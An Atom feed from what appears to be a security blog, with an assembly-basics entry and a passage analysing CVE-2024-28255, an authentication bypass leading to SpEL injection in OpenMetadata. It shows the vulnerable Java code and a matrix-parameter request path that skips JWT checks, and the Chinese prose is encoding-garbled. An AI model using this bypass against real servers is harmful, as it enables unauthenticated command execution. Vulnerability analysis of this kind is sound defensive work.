<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Drunkbaby&#39;s Blog</title>
  
  <subtitle>Hexo theme keep quick starter</subtitle>
  <link href="https://drun1baby.github.io/atom.xml" rel="self"/>
  
  <link href="https://drun1baby.github.io/"/>
  <updated>2024-06-03T07:23:20.990Z</updated>
  <id>https://drun1baby.github.io/</id>
  
  <author>
    <name>Keep Team</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>æ±‡ç¼–å…¥é—¨å­¦ä¹ </title>
    <link href="https://drun1baby.github.io/2024/05/11/%E6%B1%87%E7%BC%96%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/"/>
    <id>https://drun1baby.github.io/2024/05/11/%E6%B1%87%E7%BC%96%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/</id>
    <published>2024-05-11T13:10:54.000Z</published>
    <updated>2024-06-03T07:23:20.990Z</updated>
    
    <content type="html"><![CDATA[<p><a class="link" href="https://www.bilibili.com/video/BV1Rs411c7HG">https://www.bilibili.com/video/BV1Rs411c7HG<i class="fas fa-external-link-alt"></i></a></p><h2 id="åŸºç¡€çŸ¥è¯†"><a href="#åŸºç¡€çŸ¥è¯†" class="headerlink" title="åŸºç¡€çŸ¥è¯†"></a>åŸºç¡€çŸ¥è¯†</h2><p>æ±‡ç¼–è¯­è¨€æ˜¯ç›´æ¥åœ¨ç¡¬ä»¶ä¹‹ä¸Šå·¥ä½œçš„ç¼–ç¨‹è¯­è¨€ï¼Œé¦–å¸­æŒ‰è¦äº†è§£ç¡¬ä»¶ç³»ç»Ÿçš„ç»“æ„ï¼Œæ‰èƒ½æœ‰æ•ˆçš„åº”ç”¨æ±‡ç¼–è¯­è¨€å¯¹å…¶ç¼–ç¨‹ã€‚</p><p>æ±‡ç¼–çš„ç ”ç©¶é‡ç‚¹æ”¾åœ¨å¦‚ä½•åˆ©ç”¨ç¡¬ä»¶ç³»ç»Ÿçš„ç¼–ç¨‹ç»“æ„å’ŒæŒ‡ä»¤é›†æœ‰æ•ˆçµæ´»çš„æ§åˆ¶ç³»ç»Ÿè¿›è¡Œå·¥ä½œã€‚</p><h3 id="æœºå™¨è¯­è¨€"><a href="#æœºå™¨è¯­è¨€" class="headerlink" title="æœºå™¨è¯­è¨€"></a>æœºå™¨è¯­è¨€</h3><p>æœºå™¨è¯­è¨€æ˜¯æœºå™¨æŒ‡ä»¤çš„é›†åˆã€‚</p><p>æœºå™¨æŒ‡ä»¤å±•å¼€æ¥è®²å°±æ˜¯ä¸€å°æœºå™¨å¯ä»¥æ­£ç¡®æ‰§è¡Œçš„å‘½ä»¤ã€‚æ¯”å¦‚è¿™ä¸ªæŒ‡ä»¤ <code>01010000</code> ï¼ˆPUSH AXï¼‰â€”â€” æŠŠ AX æ¨è¿›å †æ ˆã€‚</p><p>è€Œæœºå™¨ç åªè®¤è¯† 01ï¼Œæ‰€ä»¥åœ¨å¾ˆå¤šæ—¶å€™éå¸¸ä¸æ–¹ä¾¿ï¼Œè¿™å°±äº§ç”Ÿäº†æ±‡ç¼–è¯­è¨€</p><h2 id="æ±‡ç¼–è¯­è¨€"><a href="#æ±‡ç¼–è¯­è¨€" class="headerlink" title="æ±‡ç¼–è¯­è¨€"></a>æ±‡ç¼–è¯­è¨€</h2><p>æ±‡ç¼–è¯­è¨€çš„ä¸»ä½“æ˜¯æ±‡ç¼–æŒ‡ä»¤ï¼Œæ±‡ç¼–è¯­è¨€å’Œæœºå™¨è¯­è¨€å…¶å®æ˜¯ä¸€ä¸€å¯¹åº”çš„ï¼Œä¹Ÿå°±æ˜¯ç›´æ¥æŠŠ 01 ç¿»è¯‘æˆäº†å¯¹åº”èƒ½è¢«è¯†åˆ«çš„ä¸œè¥¿ã€‚å¦‚ä¸‹çš„ä¸€ä¸ªä¾‹å­å°±æ˜¯å¾ˆå¥½çš„è¯´æ˜ã€‚</p><img src="/2024/05/11/%E6%B1%87%E7%BC%96%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/sample1.png" class><h3 id="å¯„å­˜å™¨"><a href="#å¯„å­˜å™¨" class="headerlink" title="å¯„å­˜å™¨"></a>å¯„å­˜å™¨</h3><p>ç®€å•çš„è®²æ˜¯ CPU ä¸­å¯ä»¥å­˜å‚¨æ•°æ®çš„å™¨ä»¶ï¼Œä¸€ä¸ª CPU ä¸­æœ‰å¤šä¸ªå¯„å­˜å™¨ã€‚</p><p>AX æ˜¯å…¶ä¸­ä¸€ä¸ªå¯„å­˜å™¨çš„ä»£å·ï¼ŒBX åˆ™æ˜¯å¦ä¸€ä¸ªå¯„å­˜å™¨çš„ä»£å·ã€‚</p><ul><li>ç„¶è€Œè¿™é‡Œåˆæ¶‰åŠåˆ°ä¸€ä¸ªæ¦‚å¿µï¼Œè®¡ç®—æœºèƒ½è¯»æ‡‚çš„åªæœ‰æœºå™¨è¯­è¨€ï¼Œæ€ä¹ˆæ ·è®©è®¡ç®—æœºè¯»æ‡‚æ±‡ç¼–è¯­è¨€å‘¢ï¼Ÿ</li></ul><p>ä¸­é—´å…¶å®æ˜¯é€šè¿‡ä¸€ä¸ªç¼–è¯‘å™¨ï¼Œå®ƒä¼šå°†æ±‡ç¼–æŒ‡ä»¤ç¿»è¯‘ä¸ºæœºå™¨ç ã€‚</p><h3 id="æ±‡ç¼–è¯­è¨€çš„ç»„æˆ"><a href="#æ±‡ç¼–è¯­è¨€çš„ç»„æˆ" class="headerlink" title="æ±‡ç¼–è¯­è¨€çš„ç»„æˆ"></a>æ±‡ç¼–è¯­è¨€çš„ç»„æˆ</h3><p>æ±‡ç¼–è¯­è¨€ç”±ä»¥ä¸‹ä¸‰ç±»ç»„æˆ</p><p>1ã€æ±‡ç¼–æŒ‡ä»¤ï¼ˆæœºå™¨ç çš„åŠ©è®°ç¬¦ï¼‰<br>2ã€ä¼ªæŒ‡ä»¤ï¼ˆç”±ç¼–è¯‘å™¨æ‰§è¡Œï¼Œç¼–è¯‘å™¨è®¤è¯†ï¼Œè®¡ç®—æœºä¸è®¤è¯†ï¼‰<br>3ã€å…¶ä»–ç¬¦å·ï¼ˆç”±ç¼–è¯‘å™¨è¯†åˆ«ï¼Œæ¯”å¦‚åŠ å‡ä¹˜é™¤ï¼‰</p><p>æ±‡ç¼–è¯­è¨€çš„æ ¸å¿ƒæ˜¯æ±‡ç¼–æŒ‡ä»¤ï¼Œå®ƒå†³å®šäº†æ±‡ç¼–è¯­è¨€çš„ç‰¹æ€§ã€‚</p><h3 id="å­˜å‚¨å™¨"><a href="#å­˜å‚¨å™¨" class="headerlink" title="å­˜å‚¨å™¨"></a>å­˜å‚¨å™¨</h3><p>CPU æ˜¯è®¡ç®—æœºçš„æ ¸å¿ƒéƒ¨åˆ†ï¼Œå®ƒæ§åˆ¶äº†æ•´ä¸ªè®¡ç®—æœºçš„è¿ä½œå¹¶è¿›è¡Œè¿ç®—ï¼Œè¦æƒ³è®©ä¸€ä¸ª CPU å·¥ä½œï¼Œå°±å¿…é¡»è¦å‘å®ƒæä¾›æŒ‡ä»¤å’Œæ•°æ®ã€‚</p><ul><li>æŒ‡ä»¤å’Œæ•°æ®åœ¨å­˜å‚¨å™¨ä¸­å­˜æ”¾ï¼Œä¹Ÿå°±æ˜¯å¹³æ—¶æ‰€è¯´çš„å†…å­˜ã€‚</li><li>CPU æ˜¯åŸºäºå†…å­˜è¿è¡Œçš„ï¼Œç¦»å¼€äº†å†…å­˜ï¼Œæ€§èƒ½å†å¥½çš„ CPU ä¹Ÿæ— æ³•å·¥ä½œã€‚</li></ul><p>ç£ç›˜ä¸åŒäºå†…å­˜ï¼Œç£ç›˜ä¸Šçš„æ•°æ®æˆ–ç¨‹åºå¦‚æœä¸è¢«è¯»åˆ°å†…å­˜ä¸­ï¼Œå°±æ— æ³•è¢« CPU ä½¿ç”¨ã€‚</p><h3 id="æŒ‡ä»¤å’Œæ•°æ®"><a href="#æŒ‡ä»¤å’Œæ•°æ®" class="headerlink" title="æŒ‡ä»¤å’Œæ•°æ®"></a>æŒ‡ä»¤å’Œæ•°æ®</h3><p>æŒ‡ä»¤å’Œæ•°æ®æ˜¯åº”ç”¨ä¸Šçš„æ¦‚å¿µã€‚åœ¨å†…å­˜æˆ–ç£ç›˜ä¸Šï¼ŒæŒ‡ä»¤å’Œæ•°æ®æ²¡æœ‰ä»»ä½•åŒºåˆ«ï¼Œéƒ½æ˜¯äºŒè¿›åˆ¶ä¿¡æ¯ã€‚</p><p>æ¯”å¦‚ç›®å‰æœ‰ä¸ªäºŒè¿›åˆ¶ <code>1000100111011000</code></p><p>å¯¹åº”çš„æ•°æ®ä¸º â€”â€”&gt; 89D8Hï¼ˆæ•°æ®ï¼‰<br>åŒæ ·å¯ä»¥è¡¨ç¤ºä¸ºä¸€ä¸ªæŒ‡ä»¤ â€”â€”&gt; MOV AX,BXï¼ˆç¨‹åºï¼‰</p><h3 id="å­˜å‚¨å•å…ƒ"><a href="#å­˜å‚¨å•å…ƒ" class="headerlink" title="å­˜å‚¨å•å…ƒ"></a>å­˜å‚¨å•å…ƒ</h3><p>å­˜å‚¨å™¨è¢«åˆ’åˆ†ä¸ºè‹¥å¹²ä¸ªå­˜å‚¨å•å…ƒï¼Œæ¯ä¸ªå­˜å‚¨å•å…ƒä» 0 å¼€å§‹é¡ºåºç¼–å·ã€‚ä¾‹å¦‚ä¸€ä¸ªå­˜å‚¨å™¨æœ‰ 128 ä¸ªå­˜å‚¨å•å…ƒï¼Œç¼–å·ä» 0 ~ 127ï¼Œå¦‚å›¾æ‰€ç¤º</p><img src="/2024/05/11/%E6%B1%87%E7%BC%96%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/unite.png" class><p>å¯¹äºå¤§å®¹é‡çš„å­˜å‚¨å™¨ä¸€èˆ¬è¿˜ç”¨ä»¥ä¸‹å•ä½æ¥è®¡é‡å®¹é‡ï¼Œç£ç›˜ä¸Šçš„å®¹é‡å•ä½åŒå†…å­˜çš„ä¸€æ ·ï¼Œå®é™…ä¸Šä»¥ä¸Šå•ä½æ˜¯å¾®æœºä¸­å¸¸ç”¨çš„è®¡é‡å•ä½ã€‚</p><p>1KB &#x3D; 1024B<br>1MB &#x3D; 1024KB<br>1GB &#x3D; 1024MB<br>1T &#x3D; 1024GB</p><h3 id="CPU-å¯¹å­˜å‚¨å™¨çš„è¯»å†™"><a href="#CPU-å¯¹å­˜å‚¨å™¨çš„è¯»å†™" class="headerlink" title="CPU å¯¹å­˜å‚¨å™¨çš„è¯»å†™"></a>CPU å¯¹å­˜å‚¨å™¨çš„è¯»å†™</h3><p>CPU æƒ³è¦è¿›è¡Œæ•°æ®çš„è¯»å†™ï¼Œå¿…é¡»å’Œå¤–éƒ¨å™¨ä»¶ï¼ˆæ ‡å‡†çš„è¯´æ³•æ˜¯èŠ¯ç‰‡ï¼‰è¿›è¡Œä¸‰ç±»ä¿¡æ¯çš„äº¤äº’</p><ul><li>å­˜å‚¨å•å…ƒçš„åœ°å€ï¼ˆåœ°å€ä¿¡æ¯ï¼Œæ¯”å¦‚å†…å­˜ã€ç¡¬ç›˜ã€æ˜¾å¡ç­‰ï¼‰</li><li>å™¨ä»¶çš„é€‰æ‹©ï¼Œè¯»æˆ–å†™å‘½ä»¤ï¼ˆæ§åˆ¶ä¿¡æ¯ï¼‰</li><li>è¯»æˆ–å†™çš„æ•°æ®ï¼ˆæ•°æ®ä¿¡æ¯ï¼‰</li></ul><p>ç”±äºç”µå­è®¡ç®—æœºèƒ½å¤„ç†ã€ä¼ è¾“çš„ä¿¡æ¯éƒ½æ˜¯ç”µä¿¡å·ï¼Œç”µä¿¡å·æ˜¯ç”¨å¯¼çº¿ä¼ é€çš„ï¼Œè¿™ä¹Ÿæ˜¯ CPU ä¼ è¾“åœ°å€ã€æ•°æ®ã€æ§åˆ¶ä¿¡æ¯çš„é€šé“ã€‚</p><p>åœ¨è®¡ç®—æœºä¸­æœ‰ä¸“é—¨è¿æ¥ CPU å’Œå…¶ä»–èŠ¯ç‰‡çš„å¯¼çº¿ï¼Œé€šå¸¸ç§°ä¸ºæ€»çº¿ã€‚</p><p><strong>æ€»çº¿</strong>ï¼šæ˜¯æŒ‡è®¡ç®—æœºç»„ä»¶é—´è§„èŒƒåŒ–çš„äº¤æ¢æ•°æ®ï¼ˆdataï¼‰çš„æ–¹å¼ï¼Œå³ä»¥ä¸€ç§é€šç”¨çš„æ–¹å¼ä¸ºå„ç»„ä»¶æä¾›æ•°æ®ä¼ é€å’Œæ§åˆ¶é€»è¾‘ã€‚</p><p>ç®€å•æ¥è¯´ï¼Œæ€»çº¿æ˜¯è®¡ç®—æœºç¡¬ä»¶è®¾å¤‡ä¹‹é—´ç”¨æ¥é€šä¿¡çš„</p><p>æ€»çº¿æ˜¯å•å‘çš„ ä¾‹å¦‚ï¼šä¸èƒ½åŒæ—¶è¿›è¡Œè¯»å–å’Œå†™å…¥çš„æ“ä½œ</p><p>ç‰©ç†ä¸Šï¼šä¸€æ ¹æ ¹å¯¼çº¿çš„é›†åˆï¼›<br>é€»è¾‘ä¸Šï¼šåœ°å€æ€»çº¿ã€æ•°æ®æ€»çº¿ã€æ§åˆ¶æ€»çº¿</p><p>ç”¨ä¸‹å›¾æ¥è¡¨ç¤º</p><img src="/2024/05/11/%E6%B1%87%E7%BC%96%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/cpu2Storage.png" class><ul><li>æ•°æ®æ€»çº¿ï¼ˆData Busï¼‰ï¼šåœ¨ CPU ä¸ RAM ä¹‹é—´æ¥å›ä¼ é€éœ€è¦å¤„ç†æˆ–æ˜¯éœ€è¦å‚¨å­˜çš„æ•°æ®ã€‚æ€»çº¿æ˜¯å®½åº¦å†³å®šäº† CPU ä¸å…¶å®ƒå™¨ä»¶è¿›è¡Œæ•°æ®ä¼ é€æ—¶ä¸€æ¬¡æ•°æ®çš„ä¼ é€é‡ã€‚è¿™ä¹Ÿå°±å†³å®šäº†ä¼ é€é€Ÿåº¦ã€‚</li><li>åœ°å€æ€»çº¿ï¼ˆAddress Busï¼‰ï¼šç”¨æ¥æŒ‡å®šåœ¨ RAMï¼ˆRandom Access Memoryï¼‰ä¹‹ä¸­å‚¨å­˜çš„æ•°æ®çš„åœ°å€ã€‚æ€»çº¿å®½åº¦å†³å®šäº† CPU çš„å¯»å€èƒ½åŠ›ã€‚ä¸€ä¸ª CPU æœ‰ N æ ¹åœ°å€æ€»çº¿ï¼Œåˆ™å¯ä»¥è¯´è¿™ä¸ª CPU çš„åœ°å€æ€»çº¿çš„å®½åº¦ä¸º Nã€‚è¿™æ ·çš„ CPU æœ€å¤šå¯ä»¥å¯»æ‰¾ 2 çš„ N æ¬¡æ–¹ä¸ªå†…å­˜å•å…ƒã€‚</li><li>æ§åˆ¶æ€»çº¿ï¼ˆControl Busï¼‰ï¼šå°†å¾®å¤„ç†å™¨æ§åˆ¶å•å…ƒï¼ˆControl Unitï¼‰çš„ä¿¡å·ï¼Œä¼ é€åˆ°å‘¨è¾¹è®¾å¤‡ï¼Œä¸€èˆ¬å¸¸è§çš„ä¸º USB Bus å’Œ 1394 Busã€‚æ€»çº¿å®½åº¦å†³å®šäº† CPU å¯¹ç³»ç»Ÿä¸­å…¶å®ƒå™¨ä»¶çš„æ§åˆ¶èƒ½åŠ›ã€‚</li></ul>]]></content>
    
    
    <summary type="html">æ±‡ç¼–å…¥é—¨å­¦ä¹ </summary>
    
    
    
    <category term="äºŒè¿›åˆ¶" scheme="https://drun1baby.github.io/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6/"/>
    
    
    <category term="äºŒè¿›åˆ¶" scheme="https://drun1baby.github.io/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2024-28255 OpenMetaData æœªæˆæƒå‘½ä»¤æ‰§è¡Œæ¼æ´åˆ†æ</title>
    <link href="https://drun1baby.github.io/2024/04/26/CVE-2024-28255-OpenMetaData-%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>https://drun1baby.github.io/2024/04/26/CVE-2024-28255-OpenMetaData-%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2024-04-26T11:24:18.000Z</published>
    <updated>2024-04-30T12:25:36.157Z</updated>
    
    <content type="html"><![CDATA[<p>æ¯”è¾ƒç®€å•çš„ä¸€ä¸ªæ´ï¼Œä¸è¿‡æˆ‘è‡ªå·±ä¹ŸğŸ•Šäº†å¥½ä¹…äº†</p><h2 id="0x01-æ¼æ´æè¿°"><a href="#0x01-æ¼æ´æè¿°" class="headerlink" title="0x01 æ¼æ´æè¿°"></a>0x01 æ¼æ´æè¿°</h2><p>OpenMetadataæ˜¯ä¸€ä¸ªç»Ÿä¸€çš„å‘ç°ã€å¯è§‚å¯Ÿå’Œæ²»ç†å¹³å°ï¼Œç”±ä¸­å¤®å…ƒæ•°æ®å­˜å‚¨åº“ã€æ·±å…¥çš„æ²¿è¢­å’Œæ— ç¼å›¢é˜Ÿåä½œæä¾›æ”¯æŒã€‚ OpenMetadataå­˜åœ¨å®‰å…¨æ¼æ´ï¼Œè¯¥æ¼æ´æºäºå½“è¯·æ±‚çš„è·¯å¾„åŒ…å«ä»»ä½•æ’é™¤çš„ç«¯ç‚¹æ—¶ï¼Œè¿‡æ»¤å™¨å°†è¿”å›è€Œä¸éªŒè¯ JWTã€‚</p><h2 id="0x02-å½±å“ç‰ˆæœ¬"><a href="#0x02-å½±å“ç‰ˆæœ¬" class="headerlink" title="0x02 å½±å“ç‰ˆæœ¬"></a>0x02 å½±å“ç‰ˆæœ¬</h2><p>OpenMetaData &lt; 1.2.4</p><h2 id="0x03-æ¼æ´åˆ†æ"><a href="#0x03-æ¼æ´åˆ†æ" class="headerlink" title="0x03 æ¼æ´åˆ†æ"></a>0x03 æ¼æ´åˆ†æ</h2><p>debug å¾ˆç®€å•ï¼Œyml é‡Œé¢åŠ å…¥è¿™ä¸ªå³å¯</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">OPENMETADATA_DEBUG:</span> <span class="string">$&#123;OPENMETADATA_DEBUG:-true&#125;</span></span><br></pre></td></tr></table></figure><p>é¦–å…ˆæ¥çœ‹åå° RCE çš„éƒ¨åˆ†ï¼Œå…¶å®æœ‰å››ä¸ª Utils ç±»éƒ½æœ‰é—®é¢˜ï¼Œè¿™é‡ŒåªæŒ‘ä¸€ä¸ªæ¥è®²</p><p>è¯¥æ¼æ´å‡ºç°åœ¨ EventSubscriptionResource.java ä¸­ï¼Œä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GET</span>  </span><br><span class="line"><span class="meta">@Path(&quot;/validation/condition/&#123;expression&#125;&quot;)</span>  </span><br><span class="line"><span class="meta">@Operation(  </span></span><br><span class="line"><span class="meta">    operationId = &quot;validateCondition&quot;,  </span></span><br><span class="line"><span class="meta">    summary = &quot;Validate a given condition&quot;,  </span></span><br><span class="line"><span class="meta">    description = &quot;Validate a given condition expression used in filtering rules.&quot;,  </span></span><br><span class="line"><span class="meta">    responses = &#123;  </span></span><br><span class="line"><span class="meta">      @ApiResponse(responseCode = &quot;204&quot;, description = &quot;No value is returned&quot;),  </span></span><br><span class="line"><span class="meta">      @ApiResponse(responseCode = &quot;400&quot;, description = &quot;Invalid expression&quot;)  </span></span><br><span class="line"><span class="meta">    &#125;)</span>  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">validateCondition</span><span class="params">(  </span></span><br><span class="line"><span class="params">    <span class="meta">@Context</span> UriInfo uriInfo,  </span></span><br><span class="line"><span class="params">    <span class="meta">@Context</span> SecurityContext securityContext,  </span></span><br><span class="line"><span class="params">    <span class="meta">@Parameter(description = &quot;Expression to validate&quot;, schema = @Schema(type = &quot;string&quot;))</span> <span class="meta">@PathParam(&quot;expression&quot;)</span>  </span></span><br><span class="line"><span class="params">        String expression)</span> &#123;  </span><br><span class="line">  AlertUtil.validateExpression(expression, Boolean.class);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è·Ÿè¿› validateExpression æ–¹æ³•ï¼Œä¸€çœ¼ SpEL è¡¨è¾¾å¼æ³¨å…¥</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">validateExpression</span><span class="params">(String condition, Class&lt;T&gt; clz)</span> &#123;  </span><br><span class="line">  <span class="keyword">if</span> (condition == <span class="literal">null</span>) &#123;  </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line">  &#125;  </span><br><span class="line">  <span class="type">Expression</span> <span class="variable">expression</span> <span class="operator">=</span> parseExpression(condition);  </span><br><span class="line">  <span class="type">AlertsRuleEvaluator</span> <span class="variable">ruleEvaluator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AlertsRuleEvaluator</span>(<span class="literal">null</span>);  </span><br><span class="line">  <span class="keyword">try</span> &#123;  </span><br><span class="line">    <span class="keyword">return</span> expression.getValue(ruleEvaluator, clz);  </span><br><span class="line">  &#125; <span class="keyword">catch</span> (Exception exception) &#123;  </span><br><span class="line">    <span class="comment">// Remove unnecessary class details in the exception message  </span></span><br><span class="line">    <span class="type">String</span> <span class="variable">message</span> <span class="operator">=</span> exception.getMessage().replaceAll(<span class="string">&quot;on type .*$&quot;</span>, <span class="string">&quot;&quot;</span>).replaceAll(<span class="string">&quot;on object .*$&quot;</span>, <span class="string">&quot;&quot;</span>);  </span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(CatalogExceptionMessage.failedToEvaluate(message));  </span><br><span class="line">  &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥çœ‹ä¸€ä¸‹å‰é¢é‰´æƒç»•è¿‡çš„éƒ¨åˆ†</p><p>åœ¨ OpenMetadata ä½¿ç”¨ JwtFilter.java å¯¹ JWT è¿›è¡ŒéªŒè¯ï¼Œæœ‰éƒ¨åˆ† API ä¸éœ€è¦åšè®¤è¯ï¼Œåœ¨ JwtFilter.java å¯¹è¿™éƒ¨åˆ†ä¸éœ€è¦åšè®¤è¯çš„ API è¿›è¡Œæ’é™¤ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> List&lt;String&gt; EXCLUDED_ENDPOINTS =  </span><br><span class="line">     List.of(  </span><br><span class="line">         <span class="string">&quot;v1/system/config&quot;</span>,  </span><br><span class="line">         <span class="string">&quot;v1/users/signup&quot;</span>,  </span><br><span class="line">         <span class="string">&quot;v1/system/version&quot;</span>,  </span><br><span class="line">         <span class="string">&quot;v1/users/registrationConfirmation&quot;</span>,  </span><br><span class="line">         <span class="string">&quot;v1/users/resendRegistrationToken&quot;</span>,  </span><br><span class="line">         <span class="string">&quot;v1/users/generatePasswordResetLink&quot;</span>,  </span><br><span class="line">         <span class="string">&quot;v1/users/password/reset&quot;</span>,  </span><br><span class="line">         <span class="string">&quot;v1/users/checkEmailInUse&quot;</span>,  </span><br><span class="line">         <span class="string">&quot;v1/users/login&quot;</span>,  </span><br><span class="line">         <span class="string">&quot;v1/users/refresh&quot;</span>);</span><br></pre></td></tr></table></figure><p>åœ¨ API è¿›è¡Œé‰´æƒæ—¶ï¼ŒOpenMetadata çš„å†™æ³•å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">filter</span><span class="params">(ContainerRequestContext requestContext)</span> &#123;  </span><br><span class="line">    <span class="keyword">try</span> &#123;  </span><br><span class="line">        <span class="type">UriInfo</span> <span class="variable">uriInfo</span> <span class="operator">=</span> requestContext.getUriInfo();  </span><br><span class="line">        <span class="keyword">if</span> (!EXCLUDED_ENDPOINTS.stream().anyMatch((endpoint) -&gt; &#123;  </span><br><span class="line">            <span class="keyword">return</span> uriInfo.getPath().contains(endpoint);  </span><br><span class="line">        &#125;))</span><br></pre></td></tr></table></figure><p>è¿™é‡Œè¦æ€ä¹ˆè¿›è¡Œæ¼æ´åˆ©ç”¨å‘¢ï¼Ÿç»“åˆä»¥å¾€æœ€å¸¸è§çš„ bypass æ‰‹æ®µåº”è¯¥æ˜¯ <code>/v1/users/login/../../../xxx/xxx</code>ï¼Œä½†æ˜¯è¿™é‡Œçš„ä¸­é—´ä»¶æ˜¯ Jerseyï¼Œç”¨ <code>/</code> æ˜¯æ— æ•ˆçš„ã€‚ä½†æ˜¯ç±»ä¼¼<code>;</code>çŸ©é˜µå‚æ•°ä¼šè¿›è¡Œå¤„ç†ï¼š</p><p>åœ¨ .class æ–‡ä»¶å½“ä¸­ï¼Œendpoint æ²¡åŠæ³•è¿½è¸ªå˜é‡ï¼Œåç¼–è¯‘çœ‹äº†ä¸€ä¸‹ï¼Œä¸€ä¸‹å­å°±çœ‹æ˜ç™½äº†ï¼ŒgetPath() ç”¨æ¥è·å–è¯·æ±‚çš„æ•´ä¸ªè·¯å¾„ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">filter</span><span class="params">(ContainerRequestContext requestContext)</span> &#123;</span><br><span class="line">  <span class="type">UriInfo</span> <span class="variable">uriInfo</span> <span class="operator">=</span> requestContext.getUriInfo();</span><br><span class="line">  <span class="keyword">if</span> (EXCLUDED_ENDPOINTS.stream().anyMatch(endpoint -&gt; uriInfo.getPath().contains(endpoint))) &#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  ...</span><br><span class="line">  &lt;JWT Token Validation&gt;</span><br></pre></td></tr></table></figure><img src="/2024/04/26/CVE-2024-28255-OpenMetaData-%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/path.png" class><p>uriInfo.getPath() ä¸­åŒ…å« JwtFilter ä¸­çš„ç™½åå•åˆ—è¡¨ã€‚çœ‹å®Œäº†è·¯å¾„ç»•è¿‡ï¼Œæˆ‘ä¸ªäººå¯¹æœ€ç»ˆå®ç°æ¯”è¾ƒå¥½å¥‡ï¼Œä¸ºä»€ä¹ˆæˆ‘å‘èµ·ä¸€ä¸ª <code>/api/v1;v1/users/login/events/subscriptions/validation/condition</code> çš„è¯·æ±‚ï¼Œæœ€ç»ˆå´èƒ½è¯·æ±‚åˆ° <code>/v1/events/subscriptions/subscriptions/validation/condition</code> å‘¢</p><p>ç±»ä¼¼äº Tomcatï¼Œåœ¨ glassfish&#x2F;jersey ä¸­æœ‰ä¸€ä¸ª doDispatcher æ¥åšè¯·æ±‚çš„é›†ä¸­å¤„ç†ä¸åˆ†å‘çš„è´£ä»»é“¾æœºåˆ¶ï¼Œå¯¹åº”çš„è·¯ç”±å¤„ç†æ˜¯åœ¨ <code>org.glassfish.jersey.server.internal.routing.RoutingStage#apply</code> æ–¹æ³•</p><img src="/2024/04/26/CVE-2024-28255-OpenMetaData-%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/apply.png" class><p>å¯¹äºå­èµ„æºç±»å‹çš„è¯·æ±‚ï¼Œè¿™é‡Œä¼šé€çº§æŸ¥æ‰¾ã€‚é¦–å…ˆæ‰¾åˆ°å‰ç¼€åŒ¹é…çš„çš„é¡¶çº§è·¯ç”±ï¼Œç„¶åæ ¹æ®é¡¶çº§è·¯ç”±è¿›è¡ŒæŸ¥æ‰¾ã€‚è·Ÿè¿›è‡³ 